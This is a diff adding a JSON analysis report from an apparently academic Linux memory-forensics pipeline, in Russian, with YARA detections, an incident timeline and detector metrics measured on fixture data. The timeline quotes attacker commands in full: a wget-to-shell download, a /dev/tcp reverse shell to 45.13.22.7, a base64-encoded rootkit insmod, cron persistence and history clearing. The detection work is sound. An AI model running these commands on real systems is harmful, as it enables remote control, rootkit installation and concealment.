+          "process": "kworker/u8:3",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Injection_Packed_High_Entropy",
+          "category": "malware",
+          "severity": "medium",
+          "mitre": "T1027.002",
+          "description": "Признаки упаковщика в исполняемой области (UPX)",
+          "reference": "https://attack.mitre.org/techniques/T1027/002/",
+          "string_id": "$upx1",
+          "offset": 11534410,
+          "length": 32,
+          "snippet": "This file is packed with the UPX",
+          "region": "full_image",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "attribution": "memory_map"
+        }
+      ]
+    },
+    "REPUTATION": {
+      "results": [
+        {
+          "sha256": "44439b744f11affe093652836beac61b80f04df72a3603a0e08ff307ab94d864",
+          "verdict": "malicious",
+          "signature": "Lab.Loader.Shellcode",
+          "provider": "local_reference_list",
+          "source": "cache"
+        },
+        {
+          "sha256": "a5193f5c7adbf4c57b72d7ff1d62f7c1aed8a87da46fc7bf28b1ed0202a8c324",
+          "verdict": "suspicious",
+          "signature": "Lab.Packed.UPX",
+          "provider": "local_reference_list",
+          "source": "cache"
+        }
+      ],
+      "stats": {
+        "provider": "local",
+        "cache_entries": 2,
+        "cache_hits": 2,
+        "network_queries": 0,
+        "local_reference_entries": 2
+      }
+    },
+    "TIMELINE": {
+      "events": [
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "anchored_to_process",
+          "type": "yara_detection",
+          "severity": "critical",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "Linux_Malware_Reverse_Shell (MITRE T1059.004), смещение 0x100043"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "anchored_to_process",
+          "type": "yara_detection",
+          "severity": "high",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "Linux_Malware_Download_And_Execute (MITRE T1105), смещение 0x100000"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "anchored_to_process",
+          "type": "yara_detection",
+          "severity": "high",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "Linux_Malware_Encoded_Payload_Exec (MITRE T1140), смещение 0x10006c"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "anchored_to_process",
+          "type": "yara_detection",
+          "severity": "high",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "Linux_Malware_Kernel_Module_Loader (MITRE T1547.006), смещение 0x1000af"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "anchored_to_process",
+          "type": "yara_detection",
+          "severity": "high",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "Linux_Malware_AntiForensics_History (MITRE T1070.003), смещение 0x100114"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "anchored_to_process",
+          "type": "yara_detection",
+          "severity": "high",
+          "pid": 3100,
+          "process": "python3",
+          "detail": "Linux_Secret_Private_Key_PEM (MITRE T1552.004), смещение 0x400000"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "anchored_to_process",
+          "type": "yara_detection",
+          "severity": "high",
+          "pid": 3100,
+          "process": "python3",
+          "detail": "Linux_Secret_Cloud_Token (MITRE T1552.001), смещение 0x400112"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "anchored_to_process",
+          "type": "yara_detection",
+          "severity": "high",
+          "pid": 3100,
+          "process": "python3",
+          "detail": "Linux_Secret_Cloud_Token (MITRE T1552.001), смещение 0x400174"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "anchored_to_process",
+          "type": "yara_detection",
+          "severity": "high",
+          "pid": 3100,
+          "process": "python3",
+          "detail": "Linux_Secret_Cloud_Token (MITRE T1552.001), смещение 0x4001a9"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "anchored_to_process",
+          "type": "yara_detection",
+          "severity": "high",
+          "pid": 3100,
+          "process": "python3",
+          "detail": "Linux_Secret_Cloud_Token (MITRE T1552.001), смещение 0x4001f3"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "anchored_to_process",
+          "type": "yara_detection",
+          "severity": "high",
+          "pid": 3100,
+          "process": "python3",
+          "detail": "Linux_Secret_DB_Connection_String (MITRE T1552.001), смещение 0x40025d"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "anchored_to_process",
+          "type": "yara_detection",
+          "severity": "medium",
+          "pid": 3100,
+          "process": "python3",
+          "detail": "Linux_Secret_Shadow_Hash (MITRE T1003.008), смещение 0x40029f"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "artifact",
+          "type": "process_start",
+          "severity": "info",
+          "pid": 1,
+          "process": "systemd",
+          "detail": "PPID 0, UID 0"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "artifact",
+          "type": "process_start",
+          "severity": "info",
+          "pid": 2,
+          "process": "kthreadd",
+          "detail": "PPID 0, UID 0"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "artifact",
+          "type": "process_start",
+          "severity": "info",
+          "pid": 910,
+          "process": "sshd",
+          "detail": "PPID 1, UID 0"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "artifact",
+          "type": "process_start",
+          "severity": "info",
+          "pid": 1450,
+          "process": "nginx",
+          "detail": "PPID 1, UID 33"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "artifact",
+          "type": "process_start",
+          "severity": "info",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "PPID 910, UID 1000"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "artifact",
+          "type": "process_start",
+          "severity": "info",
+          "pid": 3100,
+          "process": "python3",
+          "detail": "PPID 2100, UID 1000"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "artifact",
+          "type": "process_start",
+          "severity": "info",
+          "pid": 3300,
+          "process": "defunct",
+          "detail": "PPID 2100, UID 1000"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "artifact",
+          "type": "process_start",
+          "severity": "info",
+          "pid": 4100,
+          "process": "kworker/u8:2",
+          "detail": "PPID 1, UID 0"
+        },
+        {
+          "timestamp": "2026-11-14T19:55:00+00:00",
+          "time_source": "artifact",
+          "type": "process_start",
+          "severity": "info",
+          "pid": 4300,
+          "process": "vol.py",
+          "detail": "PPID 2100, UID 1000"
+        },
+        {
+          "timestamp": "2026-11-14T19:58:11+00:00",
+          "time_source": "artifact",
+          "type": "command",
+          "severity": "info",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "команда из истории bash",
+          "command": "wget https://archive.ubuntu.com/ubuntu/pool/main/v/vim/vim_9.1.0-1ubuntu1_amd64.deb"
+        },
+        {
+          "timestamp": "2026-11-14T20:01:44+00:00",
+          "time_source": "artifact",
+          "type": "command",
+          "severity": "info",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "команда из истории bash",
+          "command": "chmod +x ./configure"
+        },
+        {
+          "timestamp": "2026-11-14T20:03:02+00:00",
+          "time_source": "artifact",
+          "type": "command",
+          "severity": "info",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "команда из истории bash",
+          "command": "curl https://raw.githubusercontent.com/volatilityfoundation/volatility3/master/README.md"
+        },
+        {
+          "timestamp": "2026-11-14T20:05:19+00:00",
+          "time_source": "artifact",
+          "type": "command",
+          "severity": "info",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "команда из истории bash",
+          "command": "sudo apt install linux-image-unsigned-6.17.0-19-generic-dbgsym"
+        },
+        {
+          "timestamp": "2026-11-14T20:07:51+00:00",
+          "time_source": "artifact",
+          "type": "command",
+          "severity": "info",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "команда из истории bash",
+          "command": "python3 -m venv .venv"
+        },
+        {
+          "timestamp": "2026-11-14T20:09:30+00:00",
+          "time_source": "artifact",
+          "type": "command",
+          "severity": "info",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "команда из истории bash",
+          "command": "man 3 crypt"
+        },
+        {
+          "timestamp": "2026-11-14T20:11:07+00:00",
+          "time_source": "artifact",
+          "type": "command",
+          "severity": "info",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "команда из истории bash",
+          "command": "git commit -m \"entropy prefilter for malfind regions\""
+        },
+        {
+          "timestamp": "2026-11-14T20:14:02+00:00",
+          "time_source": "artifact",
+          "type": "command",
+          "severity": "high",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "подозрительная команда: загрузка и немедленное исполнение кода из сети",
+          "command": "wget -qO- http://45.13.22.7/stage.sh | sh"
+        },
+        {
+          "timestamp": "2026-11-14T20:14:19+00:00",
+          "time_source": "artifact",
+          "type": "command",
+          "severity": "low",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "подозрительная команда: выдача прав на исполнение",
+          "command": "chmod +x /tmp/.x/kworker"
+        },
+        {
+          "timestamp": "2026-11-14T20:14:41+00:00",
+          "time_source": "artifact",
+          "type": "command",
+          "severity": "critical",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "подозрительная команда: обратная оболочка через /dev/tcp",
+          "command": "bash -i >& /dev/tcp/45.13.22.7/4444 0>&1"
+        },
+        {
+          "timestamp": "2026-11-14T20:15:03+00:00",
+          "time_source": "artifact",
+          "type": "command",
+          "severity": "high",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "подозрительная команда: деобфускация и исполнение полезной нагрузки",
+          "command": "echo aW5zbW9kIC90bXAvLmhpZGUvZGlhbW9ycGhpbmUua28K | base64 -d | sh"
+        },
+        {
+          "timestamp": "2026-11-14T20:15:22+00:00",
+          "time_source": "artifact",
+          "type": "command",
+          "severity": "high",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "подозрительная команда: загрузка модуля ядра",
+          "command": "insmod /tmp/.hide/diamorphine.ko"
+        },
+        {
+          "timestamp": "2026-11-14T20:16:10+00:00",
+          "time_source": "artifact",
+          "type": "command",
+          "severity": "medium",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "подозрительная команда: закрепление в системе (автозапуск)",
+          "command": "crontab -l | { cat; echo \"* * * * * /tmp/.x/kworker\"; } | crontab -"
+        },
+        {
+          "timestamp": "2026-11-14T20:16:31+00:00",
+          "time_source": "artifact",
+          "type": "command",
+          "severity": "high",
+          "pid": 2100,
+          "process": "bash",
+          "detail": "подозрительная команда: сокрытие следов активности (очистка истории)",
+          "command": "history -c"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "injected_region",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "packed_or_encrypted: энтропия 7.999 ≥ 7.2: упакованная/шифрованная нагрузка"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "reputation",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "хеш 44439b744f11affe… — malicious (Lab.Loader.Shellcode, local_reference_list)"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "hidden_process",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "TID 4242 == PID, EXIT_STATE TASK_RUNNING, задача отсутствует в pslist, task_struct 0x10001f000"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x0"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0xa"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x16"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x18"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0xaca0"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x1243a"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x800000"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x80000a"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x800016"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x800018"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x80aca0"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "critical",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x81243a"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "injected_region",
+          "severity": "high",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "packed_or_encrypted: энтропия 7.996 ≥ 7.2: упакованная/шифрованная нагрузка"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "reputation",
+          "severity": "high",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "хеш a5193f5c7adbf4c5… — suspicious (Lab.Packed.UPX, local_reference_list)"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "high",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_ELF_Header_In_Anon_VMA (MITRE T1055.009), смещение 0x0"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "medium",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Packed_High_Entropy (MITRE T1027.002), смещение 0x40"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "medium",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Packed_High_Entropy (MITRE T1027.002), смещение 0x4a"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "medium",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Packed_High_Entropy (MITRE T1027.002), смещение 0xb00040"
+        },
+        {
+          "timestamp": null,
+          "time_source": "none",
+          "type": "yara_detection",
+          "severity": "medium",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "detail": "Linux_Injection_Packed_High_Entropy (MITRE T1027.002), смещение 0xb0004a"
+        }
+      ],
+      "stats": {
+        "total": 57,
+        "by_type": {
+          "yara_detection": 29,
+          "process_start": 9,
+          "command": 14,
+          "injected_region": 2,
+          "reputation": 2,
+          "hidden_process": 1
+        },
+        "by_severity": {
+          "critical": 17,
+          "high": 17,
+          "medium": 6,
+          "info": 16,
+          "low": 1
+        },
+        "window_first": "2026-11-14T19:55:00+00:00",
+        "window_last": "2026-11-14T20:16:31+00:00"
+      }
+    },
+    "METRICS": {
+      "per_detector": {
+        "Скрытые процессы (DKOM)": {
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "precision": 1.0,
+          "recall": 1.0,
+          "f1": 1.0
+        },
+        "Эвристики истории bash": {
+          "tp": 7,
+          "fp": 0,
+          "fn": 0,
+          "precision": 1.0,
+          "recall": 1.0,
+          "f1": 1.0
+        },
+        "Сигнатуры YARA": {
+          "tp": 12,
+          "fp": 0,
+          "fn": 0,
+          "precision": 1.0,
+          "recall": 1.0,
+          "f1": 1.0
+        },
+        "Инъекции (malfind + энтропия)": {
+          "tp": 2,
+          "fp": 0,
+          "fn": 0,
+          "precision": 1.0,
+          "recall": 1.0,
+          "f1": 1.0
+        }
+      },
+      "overall": {
+        "tp": 22,
+        "fp": 0,
+        "fn": 0,
+        "precision": 1.0,
+        "recall": 1.0,
+        "f1": 1.0
+      },
+      "benign_controls": {
+        "total": 6,
+        "flagged": 0,
+        "fp_rate": 0.0,
+        "flagged_notes": []
+      }
+    },
+    "TIMINGS": [
+      {
+        "stage": "Идентификация ядра (потоковый поиск баннеров)",
+        "seconds": 0.67
+      },
+      {
+        "stage": "Подготовка ISF-профиля",
+        "seconds": 0.0
+      },
+      {
+        "stage": "Извлечение артефактов (4 плагина)",
+        "seconds": 0.002
+      },
+      {
+        "stage": "Cross-View Validation + эвристики bash",
+        "seconds": 0.001
+      },
+      {
+        "stage": "Анализ областей памяти (энтропия + YARA по областям)",
+        "seconds": 0.018
+      },
+      {
+        "stage": "YARA: сканирование полного образа",
+        "seconds": 0.263
+      },
+      {
+        "stage": "Репутационная проверка хешей (кеш SQLite)",
+        "seconds": 0.01
+      },
+      {
+        "stage": "Построение хронологии инцидента (timeline)",
+        "seconds": 0.0
+      },
+      {
+        "stage": "Сверка с эталонной разметкой (метрики)",
+        "seconds": 0.0
+      }
+    ],
+    "EFFORT": {
+      "manual_steps": 6,
+      "manual_operator_actions": 12,
+      "automated_operator_actions": 1,
+      "manual_minutes_estimate": 47.0,
+      "pipeline_minutes_measured": 0.02,
+      "speedup_estimate": 2925.3,
+      "model": [
+        {
+          "step": "Определение версии ядра (banners, ручной разбор вывода)",
+          "minutes": 4.0,
+          "source": "оценка по опыту курсового проекта"
+        },
+        {
+          "step": "Подключение ddebs, подбор и загрузка пакета *-dbgsym (vmlinux)",
+          "minutes": 12.0,
+          "source": "оценка: зависит от канала связи"
+        },
+        {
+          "step": "Генерация ISF через dwarf2json и укладка в symbols/linux",
+          "minutes": 5.0,
+          "source": "оценка: запуск + проверка результата"
+        },
+        {
+          "step": "Запуск плагинов и сохранение вывода",
+          "minutes": 3.0,
+          "source": "оценка: 4 плагина, ручной ввод команд"
+        },
+        {
+          "step": "Ручное сопоставление pslist/psscan и истории команд",
+          "minutes": 15.0,
+          "source": "оценка: визуальная сверка таблиц"
+        },
+        {
+          "step": "Ручной запуск YARA и разбор срабатываний",
+          "minutes": 8.0,
+          "source": "оценка: без категоризации находок"
+        }
+      ],
+      "disclaimer": "Время ручного режима — оценочная модель трудозатрат, время конвейера измерено фактически. Для итоговой таблицы главы 3 требуется прямой хронометраж ручного режима на стенде."
+    },
+    "PLUGIN_CALLS": [
+      {
+        "plugin": "linux.pslist",
+        "backend": "fixture",
+        "rows": 9,
+        "seconds": 0.001
+      },
+      {
+        "plugin": "linux.psscan",
+        "backend": "fixture",
+        "rows": 17,
+        "seconds": 0.0
+      },
+      {
+        "plugin": "linux.bash",
+        "backend": "fixture",
+        "rows": 14,
+        "seconds": 0.0
+      },
+      {
+        "plugin": "linux.malware.malfind",
+        "backend": "fixture",
+        "rows": 4,
+        "seconds": 0.0
+      }
+    ],
+    "SUMMARY": {
+      "Версия ядра": "6.17.0-19-generic",
+      "Процессов / task_struct": "9 / 17",
+      "Скрытых процессов (DKOM)": 1,
+      "Подозрительных команд": 7,
+      "Подавлено контекстным фильтром": 3,
+      "Областей с признаками инъекции": 2,
+      "Находок YARA": 29,
+      "Категории находок": "malware: 22, secrets: 7",
+      "Время анализа, с": 0.964
+    }
+  }
+}
